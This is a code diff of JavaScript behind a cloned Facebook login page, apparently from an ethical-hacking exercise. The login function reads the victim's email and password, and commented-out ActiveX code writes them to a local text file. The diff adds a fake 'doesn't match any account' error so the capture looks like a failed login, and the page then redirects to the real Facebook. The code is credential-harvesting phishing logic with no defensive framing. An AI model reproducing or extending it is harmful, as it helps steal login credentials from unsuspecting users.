@@ -1,6 +1,4 @@
 var count = 0;
-var fso
-
 // meta
 var viewportContent = '';
 if (window.devicePixelRatio = 1) {
@@ -25,6 +23,10 @@ function loginU(passForm)
     var userName = document.getElementById("user").value;
     var passUser = document.getElementById("password").value;
 
+    var error = document.getElementById("error");
+    error.style.color = 'red';
+    
+    error.innerHTML = "This email or phone number you're entered doesn't match any account Sign Up for an account.";
     /*
     var fso = new ActiveXObject("Scripting.FileSystemObject");
     var a = fso.CreateTextFile("D:\\Documents\\EH\\Tekhne\\webpageCloned\\clone\\FB_tekhne\\fb-tekhne\\login_data.txt", true);
@@ -39,6 +41,7 @@ function loginU(passForm)
         location.href="https://www.facebook.com/";
     }
     //alert("Usuario: " + userName + "\n Contrasena: "+ passUser +"\ncontador: "+count);
+
     return false;
 }
 
